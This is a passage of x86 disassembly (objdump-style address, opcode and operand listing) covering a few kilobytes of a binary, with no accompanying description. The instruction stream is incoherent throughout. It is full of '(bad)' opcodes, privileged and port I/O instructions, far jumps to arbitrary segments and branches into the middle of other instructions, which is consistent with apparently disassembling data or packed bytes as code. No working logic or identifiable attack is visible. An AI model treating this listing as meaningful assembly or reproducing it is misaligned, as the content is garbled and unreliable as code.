  40fbe0:	out    0xab,eax
  40fbe2:	cwde   
  40fbe3:	xchg   esp,eax
  40fbe4:	(bad)  
  40fbe5:	mov    cs,WORD PTR ds:0xee598d4
  40fbeb:	dec    esp
  40fbec:	mov    dh,0xae
  40fbee:	jbe    0x40fc24
  40fbf0:	add    BYTE PTR [ebx-0x712e4690],0x1
  40fbf7:	push   0xf7087159
  40fbfc:	sti    
  40fbfd:	ror    BYTE PTR [ecx],cl
  40fbff:	sbb    edi,DWORD PTR ds:0x409e33dd
  40fc05:	es sbb al,0x7c
  40fc08:	cmp    ch,BYTE PTR [ebp+0x41]
  40fc0b:	inc    esi
  40fc0c:	es out dx,eax
  40fc0e:	mov    al,ds:0x9375c548
  40fc13:	inc    esi
  40fc14:	in     al,dx
  40fc15:	in     al,dx
  40fc16:	cli    
  40fc17:	mov    dh,0x96
  40fc19:	adc    eax,0x497fdd06
  40fc1e:	mov    ebx,esp
  40fc20:	adc    edx,DWORD PTR ss:[esi+0x59a161cd]
  40fc27:	mov    eax,DWORD PTR [ebp*8+0x34b3bf8c]
  40fc2e:	mov    al,ds:0xea550850
  40fc33:	adc    BYTE PTR [edi-0x56],ch
  40fc36:	sar    BYTE PTR [ecx+0x61],0x4c
  40fc3a:	in     al,0x9
  40fc3c:	push   esp
  40fc3d:	cmp    eax,0xb8e78fab
  40fc42:	call   DWORD PTR [edx+0x1a69d160]
  40fc48:	add    ecx,DWORD PTR [eax]
  40fc4a:	cmc    
  40fc4b:	nop
  40fc4c:	lock stos DWORD PTR es:[edi],eax
  40fc4e:	xor    bh,BYTE PTR [ecx+edx*8]
  40fc51:	sbb    BYTE PTR ds:[eax+0x42e5cc07],bl
  40fc58:	pop    ebp
  40fc59:	mov    ds:0x237cba8a,al
  40fc5e:	pop    ebx
  40fc5f:	xchg   edx,eax
  40fc60:	in     al,0x13
  40fc62:	(bad)  
  40fc63:	cdq    
  40fc64:	in     al,dx
  40fc65:	dec    edi
  40fc66:	push   0x4d008069
  40fc6b:	push   0xd
  40fc6d:	mov    ebx,0xa2c2dc4d
  40fc72:	out    dx,eax
  40fc73:	jno    0x40fc72
  40fc75:	je     0x40fc0a
  40fc77:	add    al,0x4f
  40fc79:	and    al,ah
  40fc7b:	and    bl,al
  40fc7d:	loope  0x40fc31
  40fc7f:	pop    ebp
  40fc80:	in     al,0x1
  40fc82:	sbb    ebx,DWORD PTR [ebx+ecx*8+0x58]
  40fc86:	xchg   esi,eax
  40fc87:	add    ebx,DWORD PTR ds:0x9f32a2e3
  40fc8d:	or     al,0x29
  40fc8f:	or     eax,0x147bdcbf
  40fc94:	call   0xdee9:0x6ffefa6b
  40fc9b:	stos   BYTE PTR es:[edi],al
  40fc9c:	stos   BYTE PTR es:[edi],al
  40fc9d:	dec    ebp
  40fc9e:	and    al,0x56
  40fca0:	lock retf 
  40fca2:	jo     0x40fd16
  40fca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fca5:	inc    edx
  40fca6:	out    dx,al
  40fca7:	repnz adc eax,0x4c83f311
  40fcad:	xor    BYTE PTR [ebp-0x43f769b8],bh
  40fcb3:	or     bh,BYTE PTR [eax]
  40fcb5:	add    eax,0x619a8594
  40fcba:	repnz xchg edx,eax
  40fcbc:	stos   BYTE PTR es:[edi],al
  40fcbd:	js     0x40fce0
  40fcbf:	mov    ah,0x18
  40fcc1:	sbb    eax,0x9f2a038
  40fcc6:	xchg   BYTE PTR [ebp-0x4a],bl
  40fcc9:	mov    ch,0x8e
  40fccb:	daa    
  40fccc:	fsin   
  40fcce:	dec    ebx
  40fccf:	int    0x9f
  40fcd1:	sub    al,0xec
  40fcd3:	fs jl  0x40fd46
  40fcd6:	sub    BYTE PTR [ebx-0x9],dl
  40fcd9:	cmp    BYTE PTR [ecx-0x68e8db30],0xaf
  40fce0:	imul   edi,esp,0x5e2c5314
  40fce6:	or     al,0x6c
  40fce8:	cld    
  40fce9:	in     eax,0x1f
  40fceb:	mov    BYTE PTR [ebx+eiz*2-0x22449d02],bh
  40fcf2:	xor    al,0xb9
  40fcf4:	fldenv [edi]
  40fcf6:	pop    ss
  40fcf7:	adc    edi,edi
  40fcf9:	or     eax,0x451c3d02
  40fcfe:	or     dh,BYTE PTR [ebx-0x188b0cca]
  40fd04:	push   ebx
  40fd05:	add    esi,esp
  40fd07:	pop    es
  40fd08:	arpl   bx,bx
  40fd0a:	shl    ebx,cl
  40fd0c:	inc    ebp
  40fd0d:	or     al,0xb9
  40fd0f:	mov    ah,0x88
  40fd11:	sub    ecx,DWORD PTR [eax]
  40fd13:	xor    al,0xd6
  40fd15:	(bad)  
  40fd16:	xor    edi,DWORD PTR [edi+ecx*4+0x79]
  40fd1a:	and    DWORD PTR [esi+0x2dfad2b0],edx
  40fd20:	adc    eax,DWORD PTR [edx]
  40fd22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd23:	sbb    eax,0xadaff01f
  40fd28:	pop    ecx
  40fd29:	cmp    DWORD PTR [edi+0x71837c0c],esp
  40fd2f:	(bad)  
  40fd30:	call   0x3a838475
  40fd35:	dec    BYTE PTR [ecx+0x491c424d]
  40fd3b:	jge    0x40fd73
  40fd3d:	ss push edi
  40fd3f:	pop    es
  40fd40:	jnp    0x40fd26
  40fd42:	push   ds
  40fd43:	xchg   esp,eax
  40fd44:	out    0x94,al
  40fd46:	adc    BYTE PTR [edx-0x5a64a43],dl
  40fd4c:	push   eax
  40fd4d:	dec    ebx
  40fd4e:	out    dx,eax
  40fd4f:	pop    ecx
  40fd50:	push   esi
  40fd51:	push   esi
  40fd52:	(bad)  
  40fd54:	iret   
  40fd55:	test   eax,0x48bebc61
  40fd5a:	popf   
  40fd5b:	xchg   edi,eax
  40fd5c:	mov    dl,dh
  40fd5e:	mov    esp,0xc20454a8
  40fd64:	in     al,0x5c
  40fd66:	add    BYTE PTR [esi+0x29],0xc8
  40fd6a:	lds    esp,FWORD PTR [ebp-0x275f2133]
  40fd70:	test   DWORD PTR [edx],esi
  40fd72:	into   
  40fd73:	retf   
  40fd74:	pop    ecx
  40fd75:	mov    eax,0x380ed7e5
  40fd7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd7b:	jmp    0x2901:0x7a21094f
  40fd82:	loope  0x40fde1
  40fd84:	push   0x3b
  40fd86:	les    esi,FWORD PTR [ebx]
  40fd88:	aaa    
  40fd89:	push   esp
  40fd8a:	cmp    ebx,DWORD PTR [eax]
  40fd8c:	clc    
  40fd8d:	jle    0x40fdb5
  40fd8f:	ins    BYTE PTR es:[edi],dx
  40fd90:	push   cs
  40fd91:	or     BYTE PTR [ebx+ebp*1+0x4a238bf1],dl
  40fd98:	pop    ds
  40fd99:	or     ch,BYTE PTR [edx-0x420da88d]
  40fd9f:	int3   
  40fda0:	shl    BYTE PTR [esi+0x6a33280f],1
  40fda6:	test   BYTE PTR [edx+0x5e46d49],0x5c
  40fdad:	call   0xecb5:0x7f9c83c9
  40fdb4:	in     eax,dx
  40fdb5:	std    
  40fdb6:	wrmsr  
  40fdb8:	and    al,0x5a
  40fdba:	adc    DWORD PTR [eax+0x63b0d2d2],ebp
  40fdc0:	sbb    DWORD PTR [ecx-0x26],esi
  40fdc3:	and    DWORD PTR es:[edi+edx*1],esi
  40fdc7:	sub    BYTE PTR [ebp+edx*2-0x7],0x70
  40fdcc:	sbb    BYTE PTR [esi-0x78],al
  40fdcf:	in     eax,0x46
  40fdd1:	xor    esi,DWORD PTR [edi-0x51]
  40fdd4:	pop    edi
  40fdd5:	inc    edx
  40fdd6:	sbb    BYTE PTR [ecx],dh
  40fdd8:	repz (bad) 
  40fdda:	mov    al,ds:0xef6711c0
  40fddf:	(bad)  
  40fde0:	mov    esi,0x873264e8
  40fde5:	(bad)  
  40fde6:	pop    ebx
  40fde7:	or     BYTE PTR [esi-0x26],ah
  40fdea:	mov    ebx,0x7aa3d398
  40fdef:	push   esi
  40fdf0:	mov    bh,0x2e
  40fdf2:	jbe    0x40fdc4
  40fdf4:	or     eax,0x557e79ab
  40fdf9:	xchg   ebx,eax
  40fdfa:	cld    
  40fdfb:	aaa    
  40fdfc:	fist   DWORD PTR [eax+0x15]
  40fdff:	jmp    0x40fd8f
  40fe01:	add    eax,0x161e844
  40fe06:	sub    al,0x8b
  40fe08:	mov    cl,0x1d
  40fe0a:	aas    
  40fe0b:	lahf   
  40fe0c:	test   eax,0x9003e056
  40fe11:	(bad)  
  40fe12:	pop    edi
  40fe13:	adc    BYTE PTR [ebp-0x3d776967],dl
  40fe19:	(bad)  
  40fe1a:	xchg   ebx,eax
  40fe1b:	push   edi
  40fe1c:	cmp    eax,0xe2e6d97c
  40fe21:	in     eax,dx
  40fe22:	mov    DWORD PTR [edi+0x29],ebx
  40fe25:	(bad)  [edi+edi*1+0xd346ebb]
  40fe2c:	xchg   ebp,eax
  40fe2d:	shr    ch,1
  40fe2f:	int3   
  40fe30:	jle    0x40fe6a
  40fe32:	cmp    BYTE PTR [eax],al
  40fe34:	push   esp
  40fe35:	fldenv [edx+0x66]
  40fe38:	xlat   BYTE PTR ds:[ebx]
  40fe39:	ret    0x4d34
  40fe3c:	add    eax,0xd0ab4dd5
  40fe41:	les    edi,FWORD PTR [ebx]
  40fe43:	call   0x6ac5:0x9be4d5bf
  40fe4a:	sar    DWORD PTR [ebp-0x52c8a188],0xe4
  40fe51:	out    dx,al
  40fe52:	aaa    
  40fe53:	rol    BYTE PTR [edx+eiz*2+0x49c6752],0xe8
  40fe5b:	les    esi,FWORD PTR [eax+0x49]
  40fe5e:	and    bl,bl
  40fe60:	push   ecx
  40fe61:	jmp    0xdd20ed29
  40fe66:	jl     0x40fdf4
  40fe68:	(bad)  
  40fe69:	out    dx,eax
  40fe6a:	outs   dx,BYTE PTR ds:[esi]
  40fe6b:	or     eax,ecx
  40fe6d:	and    bl,BYTE PTR [esi]
  40fe6f:	arpl   dx,cx
  40fe71:	xchg   DWORD PTR [ecx+edi*1+0x22],esi
  40fe75:	out    0xc4,al
  40fe77:	jp     0x40fec2
  40fe79:	add    dl,BYTE PTR [ecx+0x3aea300c]
  40fe7f:	cs ret 0x6122
  40fe83:	or     al,0x20
  40fe85:	das    
  40fe86:	mov    ecx,0x625beed6
  40fe8b:	(bad)  
  40fe8c:	push   ds
  40fe8d:	pop    ss
  40fe8e:	test   al,0x85
  40fe90:	or     eax,0xbc754171
  40fe95:	sbb    al,0xd5
  40fe97:	cmp    eax,ecx
  40fe99:	retf   
  40fe9a:	push   esp
  40fe9b:	popf   
  40fe9c:	xchg   esp,eax
  40fe9d:	dec    ebx
  40fe9e:	ror    DWORD PTR [eax+edx*8],cl
  40fea1:	jecxz  0x40fe63
  40fea3:	fimul  DWORD PTR [eax]
  40fea5:	or     eax,0x7aed6d16
  40feaa:	xor    eax,0xe0b66297
  40feaf:	les    ebp,FWORD PTR [edx+0x22]
  40feb2:	iret   
  40feb3:	in     eax,0xaf
  40feb5:	xchg   esp,eax
  40feb6:	pop    eax
  40feb7:	stos   BYTE PTR es:[edi],al
  40feb8:	loopne 0x40feaa
  40feba:	xchg   ebp,eax
  40febb:	int    0x26
  40febd:	mov    esi,0xc7f984ea
  40fec2:	inc    edx
  40fec3:	ret    0xdf66
  40fec6:	mov    cl,0x5d
  40fec8:	sbb    eax,0x835dd34c
  40fecd:	xor    DWORD PTR [esi-0x1f],0x6418964e
  40fed4:	push   esi
  40fed5:	fst    DWORD PTR [ebp+0x52]
  40fed8:	lock ins DWORD PTR es:[edi],dx
  40feda:	cmp    esi,DWORD PTR [esi+ebp*1+0x43]
  40fede:	jle    0x40fe6b
  40fee0:	std    
  40fee1:	(bad)  
  40fee2:	repz push eax
  40fee4:	inc    esi
  40fee5:	dec    ecx
  40fee6:	dec    edx
  40fee7:	dec    edx
  40fee8:	inc    ebx
  40fee9:	loopne 0x40ff13
  40feeb:	fld    QWORD PTR [eax+ecx*1]
  40feee:	mov    ebx,0xf0176094
  40fef3:	jne    0x40fed9
  40fef5:	xor    BYTE PTR [edi-0x1d],ah
  40fef8:	call   0x2314:0x3f502297
  40feff:	jg     0x40ff26
  40ff01:	call   0x6720dc46
  40ff06:	inc    esp
  40ff07:	adc    eax,0x8df93571
  40ff0c:	add    al,bh
  40ff0e:	call   FWORD PTR [ebp+0x1bb4a868]
  40ff14:	fxch   st(5)
  40ff16:	cwde   
  40ff17:	xor    al,0x7d
  40ff19:	push   ecx
  40ff1a:	cld    
  40ff1b:	mov    ds:0xf327d9d2,eax
  40ff20:	call   0x70080c5
  40ff25:	lods   al,BYTE PTR ds:[esi]
  40ff26:	in     eax,0xb8
  40ff28:	sub    ebx,DWORD PTR [edx+0x303d6e08]
  40ff2e:	ret    
  40ff2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff30:	mov    BYTE PTR [edi-0x15],bl
  40ff33:	rcl    DWORD PTR [ecx-0x72338039],0xcb
  40ff3a:	pop    eax
  40ff3b:	xchg   edi,eax
  40ff3c:	mov    al,0x71
  40ff3e:	gs (bad) 
  40ff40:	mov    ds:0x6d0d3935,eax
  40ff45:	push   cs
  40ff46:	or     eax,0xde6e36e2
  40ff4b:	xor    BYTE PTR [edx],ch
  40ff4d:	dec    BYTE PTR [ebp+ecx*2-0x1]
  40ff51:	jl     0x40ff10
  40ff53:	and    eax,0x44be17bb
  40ff58:	mov    dl,0x8
  40ff5a:	xor    BYTE PTR [ecx-0x124108fd],dh
  40ff60:	inc    edi
  40ff61:	data16 sub al,bh
  40ff64:	fldcw  WORD PTR [edx-0x2762f0ab]
  40ff6a:	sub    DWORD PTR [esi+0x31],ebp
  40ff6d:	stc    
  40ff6e:	out    dx,al
  40ff6f:	enter  0x4a67,0x34
  40ff73:	or     BYTE PTR [edi],ah
  40ff75:	fiadd  DWORD PTR [eax+ecx*8-0x9bd8b66]
  40ff7c:	add    al,0xd8
  40ff7e:	and    BYTE PTR [esi+0x51b3acba],bl
  40ff84:	or     eax,0x59d26f65
  40ff89:	jg     0x40ff46
  40ff8b:	jmp    0x98d7:0x36c33117
  40ff92:	retf   
  40ff93:	repnz es xchg esi,eax
  40ff96:	pusha  
  40ff97:	push   ecx
  40ff98:	repnz test eax,0xa7ad5d0e
  40ff9e:	in     eax,0x69
  40ffa0:	dec    eax
  40ffa1:	loopne 0x40ffcf
  40ffa3:	ret    
  40ffa4:	push   ecx
  40ffa5:	pop    ebx
  40ffa6:	or     BYTE PTR [eax+0x6f],dl
  40ffa9:	mov    dl,0x22
  40ffab:	dec    ebp
  40ffac:	mov    al,0x9c
  40ffae:	adc    al,0x77
  40ffb0:	dec    eax
  40ffb1:	lock loop 0x40ffc7
  40ffb4:	(bad)  
  40ffb5:	stos   BYTE PTR es:[edi],al
  40ffb6:	dec    eax
  40ffb7:	adc    eax,0x58dc385c
  40ffbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffbd:	mov    bh,0x60
  40ffbf:	pusha  
  40ffc0:	aas    
  40ffc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffc2:	repz push ebp
  40ffc4:	mov    ds:0x3791125a,eax
  40ffc9:	mov    esi,0xffb439
  40ffce:	pop    edx
  40ffcf:	inc    ebx
  40ffd0:	nop
  40ffd1:	add    eax,0xa1df840e
  40ffd6:	es lock cmp al,0x1a
  40ffda:	inc    ebx
  40ffdb:	dec    eax
  40ffdc:	int    0x5d
  40ffde:	or     BYTE PTR [edx-0x1efcad94],0x2d
  40ffe5:	lds    eax,FWORD PTR [edi-0x541baef5]
  40ffeb:	sar    DWORD PTR [ebp-0x63],1
  40ffee:	(bad)  
  40ffef:	repz pusha 
  40fff1:	retf   
  40fff2:	mov    edx,0x70544487
  40fff7:	cmc    
  40fff8:	clc    
  40fff9:	push   edi
  40fffa:	leave  
  40fffb:	js     0x40ffd9
  40fffd:	fs mov dh,0xe4
  410000:	shl    BYTE PTR [edx-0x30],0x9f
  410004:	add    DWORD PTR [edx-0xcc24f3f],edx
  41000a:	cmc    
  41000b:	inc    ebp
  41000c:	fst    st(5)
  41000e:	cmp    eax,0x5b52ab6e
  410013:	pushf  
  410014:	adc    dh,bh
  410016:	and    DWORD PTR [edx],eax
  410018:	in     eax,dx
  410019:	or     al,0x4c
  41001b:	fsub   QWORD PTR [eax+0x15d2222c]
  410021:	lahf   
  410022:	adc    DWORD PTR [esi],ebp
  410024:	mov    dh,0x45
  410026:	jo     0x41001d
  410028:	fs int 0xbd
  41002b:	push   0xffffffdf
  41002d:	adc    DWORD PTR [ecx+0x20],eax
  410030:	imul   esi,DWORD PTR [eax-0x49ca1c5f],0xe8874265
  41003a:	das    
  41003b:	jne    0x4100a5
  41003d:	adc    eax,0x8fc0ae5f
  410042:	push   eax
  410043:	jns    0x40ffcb
  410045:	gs scas al,BYTE PTR es:[edi]
  410047:	mov    cl,0x91
  410049:	ror    BYTE PTR [esp+ecx*4+0x5ca32e77],1
  410050:	dec    edx
  410051:	xchg   BYTE PTR [esi],dl
  410053:	vpavgb ymm6,ymm2,YMMWORD PTR [edx-0x5e]
  410058:	pop    ds
  410059:	mov    cl,0xba
  41005b:	push   0x88be0952
  410060:	in     eax,0xb8
  410062:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410063:	cmp    BYTE PTR [ebx+0x3],0x63
  410067:	daa    
  410068:	and    eax,0xe5a4c2eb
  41006d:	ja     0x41006a
  41006f:	retf   0x46db
  410072:	mov    eax,0x37d88b68
  410077:	adc    eax,0x28462590
  41007c:	aam    0x4f
  41007e:	hlt    
  41007f:	adc    al,0x30
  410081:	xchg   esp,eax
  410082:	add    esp,DWORD PTR [esi+0x33ab2598]
  410088:	push   cs
  410089:	and    BYTE PTR [ebx+0x1c24302f],dh
  41008f:	pop    ecx
  410090:	cli    
  410091:	aam    0xcc
  410093:	scas   eax,DWORD PTR es:[edi]
  410094:	pop    ds
  410095:	xchg   ebx,eax
  410096:	cs sahf 
  410098:	xlat   BYTE PTR ds:[ebx]
  410099:	adc    esp,DWORD PTR [edi+0x62241289]
  41009f:	in     al,dx
  4100a0:	aam    0xce
  4100a2:	sahf   
  4100a3:	mov    dh,BYTE PTR [edx-0x25]
  4100a6:	ins    DWORD PTR es:[edi],dx
  4100a7:	pop    eax
  4100a8:	scas   al,BYTE PTR es:[edi]
  4100a9:	mov    ds:0x9c448ba8,al
  4100ae:	gs push ebx
  4100b0:	ret    0x1669
  4100b3:	pop    ds
  4100b4:	mov    ebp,DWORD PTR [esi-0x63]
  4100b7:	add    DWORD PTR cs:[ecx-0x183b7a23],eax
  4100be:	mov    WORD PTR [esi+0x3],ds
  4100c1:	pop    ss
  4100c2:	jg     0x410104
  4100c4:	(bad)  
  4100c5:	xor    eax,0xa27421c6
  4100ca:	mov    WORD PTR ss:[esi-0x50bed1fa],?
  4100d1:	xor    eax,0x9e7d02e1
  4100d6:	outs   dx,DWORD PTR ds:[esi]
  4100d7:	xchg   edi,eax
  4100d8:	push   ds
  4100d9:	sar    BYTE PTR [ecx-0xe2d161e],0xfa
  4100e0:	aad    0x5
  4100e2:	inc    ecx
  4100e3:	and    bl,dh
  4100e5:	ror    BYTE PTR [ebx+0x699606bf],1
  4100eb:	fsub   DWORD PTR [esp+0x25]
  4100ef:	pop    ss
  4100f0:	sub    BYTE PTR [esi-0x64],al
  4100f3:	(bad)  
  4100f4:	stos   DWORD PTR es:[edi],eax
  4100f5:	clc    
  4100f6:	pusha  
  4100f7:	div    ch
  4100f9:	pop    edx
  4100fa:	mov    ebp,0xad921aef
  4100ff:	ficomp WORD PTR [edi-0xa]
  410102:	test   BYTE PTR [esi+0x3c],ch
  410105:	sub    BYTE PTR [ecx],dh
  410107:	mov    esp,0x7222f210
  41010c:	push   eax
  41010d:	pusha  
  41010e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41010f:	mov    fs,WORD PTR ds:[ecx+edi*4-0x56752849]
  410117:	mov    eax,gs
  410119:	jno    0x4100f0
  41011b:	adc    BYTE PTR [esi],ah
  41011d:	loopne 0x41015e
  41011f:	ss in  eax,0x62
  410122:	mov    ds:0x1a7527e1,eax
  410127:	pop    ss
  410128:	gs stos BYTE PTR es:[edi],al
  41012a:	hlt    
  41012b:	push   ebp
  41012c:	dec    edx
  41012d:	clc    
  41012e:	sub    eax,0xe1868901
  410133:	dec    ebp
  410134:	aam    0x74
  410136:	mov    esi,0x34f77d5c
  41013b:	sub    eax,0x3e59f205
  410140:	into   
  410141:	out    dx,eax
  410142:	mov    ecx,DWORD PTR [edi-0x3d61f4e6]
  410148:	int    0xd7
  41014a:	icebp  
  41014b:	lods   al,BYTE PTR ds:[esi]
  41014c:	and    eax,0xf1384308
  410151:	sbb    bl,cl
  410153:	aam    0xba
  410155:	cmp    ch,ch
  410157:	outs   dx,DWORD PTR ds:[esi]
  410158:	ret    0x612
  41015b:	outs   dx,BYTE PTR ds:[esi]
  41015c:	mov    edx,0x2a8dd7ba
  410161:	scas   eax,DWORD PTR es:[edi]
  410162:	and    eax,0x102a368b
  410167:	adc    al,0x3f
  410169:	in     al,dx
  41016a:	xchg   esi,eax
  41016b:	jne    0x410127
  41016d:	push   edi
  41016e:	int    0xc5
  410170:	neg    BYTE PTR [ebx]
  410172:	nop
  410173:	cmp    al,0xeb
  410175:	add    eax,0xcaa42ab1
  41017a:	retf   
  41017b:	sbb    eax,0xe3d7c07
  410180:	test   eax,0x934a2139
  410185:	retfw  0x522d
  410189:	call   DWORD PTR [eax]
  41018b:	test   eax,0xf7ae965c
  410190:	imul   ebp,edi,0x2996eab0
  410196:	int    0x46
  410198:	jmp    0x410167
  41019a:	mov    ah,0x4c
  41019c:	pop    ss
  41019d:	lods   al,BYTE PTR ds:[esi]
  41019e:	es lock aam 0x24
  4101a2:	(bad)  
  4101a3:	scas   eax,DWORD PTR es:[edi]
  4101a4:	dec    esp
  4101a5:	mov    bh,0xa4
  4101a7:	div    DWORD PTR [edi]
  4101a9:	mov    cl,0x4
  4101ab:	mov    WORD PTR [ecx],?
  4101ad:	cmp    al,0x5f
  4101af:	mov    dl,0xef
  4101b1:	and    al,0xcc
  4101b3:	js     0x4101ad
  4101b5:	xor    ebp,DWORD PTR [esi+edx*4-0x73]
  4101b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101ba:	retf   0xce8f
  4101bd:	lods   eax,DWORD PTR ds:[esi]
  4101be:	iret   
  4101bf:	popa   
  4101c0:	fs test al,0xd4
  4101c3:	jnp    0x41018e
  4101c5:	dec    esi
  4101c6:	jnp    0x41014d
  4101c8:	cmp    al,0x15
  4101ca:	das    
  4101cb:	inc    ebx
  4101cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101cd:	outs   dx,BYTE PTR ds:[esi]
  4101ce:	push   ebp
  4101cf:	rcl    BYTE PTR [ebx+0x2f],cl
  4101d2:	and    ebp,esi
  4101d4:	or     ecx,0xffffffd7
  4101d7:	cmp    cl,BYTE PTR [ebp+0x76]
  4101da:	or     BYTE PTR [esi-0x3f],cl
  4101dd:	stos   DWORD PTR es:[edi],eax
  4101de:	cmp    BYTE PTR [ecx+0x7c],al
  4101e1:	add    al,0xf
  4101e3:	push   es
  4101e4:	cmp    DWORD PTR [ebx],ebp
  4101e6:	sub    ebx,eax
  4101e8:	mov    esi,0x8c81e893
  4101ed:	pop    ebp
  4101ee:	xor    eax,0x429345db
  4101f3:	in     al,0x2b
  4101f5:	ds ret 
  4101f7:	xchg   cx,ax
  4101f9:	scas   eax,DWORD PTR es:[edi]
  4101fa:	and    dh,BYTE PTR [ebp+0x6a]
  4101fd:	xor    ebp,ecx
  4101ff:	pop    edx
  410200:	and    edx,DWORD PTR [esi+0x76b4f056]
  410206:	aad    0xa6
  410208:	popa   
  410209:	rcl    ebp,0x67
  41020c:	call   0xba7be48f
  410211:	es iret 
  410213:	lock cmp BYTE PTR [ebx-0x4c3e8d8f],cl
  41021a:	mov    eax,ds:0xdeb407a5
  41021f:	jmp    0xb7f46088
  410224:	into   
  410225:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410226:	jmp    0x98d276ef
  41022b:	jbe    0x41027c
  41022d:	cdq    
  41022e:	mov    esi,0x483d8488
  410233:	add    BYTE PTR [ebx+eiz*8+0x3de7da14],cl
  41023a:	in     eax,dx
  41023b:	sbb    bl,0xc7
  41023e:	mov    al,0x35
  410240:	jnp    0x41029c
  410242:	stos   DWORD PTR es:[edi],eax
  410243:	and    al,0xdb
  410245:	lods   al,BYTE PTR ds:[esi]
  410246:	or     BYTE PTR ds:0x6fba131d,0xe6
  41024d:	loop   0x4101fb
  41024f:	les    edx,FWORD PTR [edx-0x99708c]
  410255:	push   ecx
  410256:	out    0xf7,al
  410258:	mov    BYTE PTR [edi+0x21],al
  41025b:	jmp    0xae05:0x1b5b48b1
  410262:	test   al,0x93
  410264:	(bad)  
  410265:	push   edi
  410266:	out    0x73,al
  410268:	mov    bl,0x7
  41026a:	or     DWORD PTR [ebx+0x2f146d5a],0x74
  410271:	xchg   ebx,eax
  410272:	push   es
  410273:	dec    esi
  410274:	xor    eax,0xbf9127fc
  410279:	xchg   edi,eax
  41027a:	inc    esi
  41027b:	loop   0x410225
  41027d:	(bad)  
  41027e:	xor    DWORD PTR [esi+eiz*1],ebp
  410281:	sbb    esi,DWORD PTR [ecx+0x17]
  410284:	pusha  
  410285:	ins    DWORD PTR es:[edi],dx
  410286:	sub    ecx,esi
  410288:	xlat   BYTE PTR ds:[ebx]
  410289:	and    eax,0x69cb367e
  41028e:	loop   0x4102b4
  410290:	dec    esp
  410291:	add    eax,0xa52db069
  410296:	into   
  410297:	or     edi,DWORD PTR [esi+0x7eb004c5]
  41029d:	push   ds
  41029e:	hlt    
  41029f:	(bad)  
  4102a1:	sahf   
  4102a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102a3:	in     eax,0x82
  4102a5:	push   ss
  4102a6:	mov    esi,0x282f8dbf
  4102ab:	mov    esi,eax
  4102ad:	(bad)  
  4102ae:	out    dx,al
  4102af:	push   0x67
  4102b1:	(bad)  
  4102b2:	xor    esp,edi
  4102b4:	mov    ebx,0x2842eca3
  4102b9:	test   al,0x78
  4102bb:	adc    BYTE PTR [esi+0x78b17aa],0x36
  4102c2:	push   ds
  4102c3:	jmp    0xc5d3e30e
  4102c8:	or     BYTE PTR [edi+0x6b412d53],dh
  4102ce:	arpl   WORD PTR [eax+eiz*1],sp
  4102d1:	push   eax
  4102d2:	xlat   BYTE PTR ds:[ebx]
  4102d3:	dec    esi
  4102d4:	sbb    BYTE PTR ds:0x574b6055,ah
  4102da:	test   BYTE PTR [esi+eax*1],ch
  4102dd:	pop    ebp
  4102de:	aad    0xa6
  4102e0:	cmp    ch,bh
  4102e2:	sub    al,0xa6
  4102e4:	jp     0x410362
  4102e6:	dec    ecx
  4102e7:	xor    ah,BYTE PTR [ecx-0x2f]
  4102ea:	mov    bh,0x64
  4102ec:	outs   dx,DWORD PTR ds:[esi]
  4102ed:	je     0x41029a
  4102ef:	xchg   esp,eax
  4102f0:	inc    edi
  4102f1:	icebp  
  4102f2:	push   0x8b7876b7
  4102f7:	push   ebp
  4102f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102fa:	out    0x8e,al
  4102fc:	pop    eax
  4102fd:	ficomp WORD PTR ds:[ecx-0x7d]
  410301:	or     DWORD PTR [edi],ebx
  410303:	call   0x22b9:0xd264b216
  41030a:	popf   
  41030b:	cli    
  41030c:	retf   0x6285
  41030f:	iret   
  410310:	clc    
  410311:	xchg   edi,eax
  410312:	in     eax,0x36
  410314:	out    0x5e,eax
  410316:	and    al,0x90
  410318:	in     eax,dx
  410319:	mov    ch,0x9d
  41031b:	retf   0x6b1d
  41031e:	jmp    0x48d1:0x7a2d51b8
  410325:	pop    ax
  410327:	cmc    
  410328:	(bad)  
  410329:	sub    ah,ah
  41032b:	data16 mov al,0xee
  41032e:	cmp    ah,BYTE PTR [edi+eiz*4+0x4f760d29]
  410335:	sbb    al,0x42
  410337:	mov    WORD PTR [esi],ds
  410339:	test   eax,0x331d4a05
  41033e:	mov    bl,0x65
  410340:	mov    ebp,0xc3d79a5c
  410345:	ja     0x410303
  410347:	push   ebp
  410348:	cdq    
  410349:	fwait
  41034a:	jb     0x41037b
  41034c:	sar    DWORD PTR [edi+0x4ea386bb],cl
  410352:	xchg   ecx,eax
  410353:	jle    0x410315
  410355:	mov    edi,0x907af571
  41035a:	out    0x7d,eax
  41035c:	cli    
  41035d:	add    edi,DWORD PTR [eax]
  41035f:	repnz sub al,0x28
  410362:	je     0x4103a5
  410364:	inc    ecx
  410365:	retf   
  410366:	mov    esi,0x9e9c03f2
  41036b:	hlt    
  41036c:	add    DWORD PTR [esi-0x51],ebx
  41036f:	mov    edx,0x3fe2eb68
  410374:	cmc    
  410375:	daa    
  410376:	mov    BYTE PTR [esi],dh
  410378:	hlt    
  410379:	sbb    eax,0xcd239f2e
  41037e:	std    
  41037f:	(bad)  
  410380:	out    0x7c,eax
  410382:	outs   dx,BYTE PTR ds:[esi]
  410383:	mov    DWORD PTR [ebp-0x5],0xd4d4e2d7
  41038a:	std    
  41038b:	xlat   BYTE PTR ds:[ebx]
  41038c:	aaa    
  41038d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41038e:	push   0x23788ac9
  410393:	addr16 (bad) 
  410395:	imul   edi
  410397:	dec    ebp
  410398:	mov    bh,0x24
  41039a:	mov    bh,0x11
  41039c:	or     BYTE PTR [esi-0xd],cl
  41039f:	mov    ch,0x5
  4103a1:	loope  0x4103cd
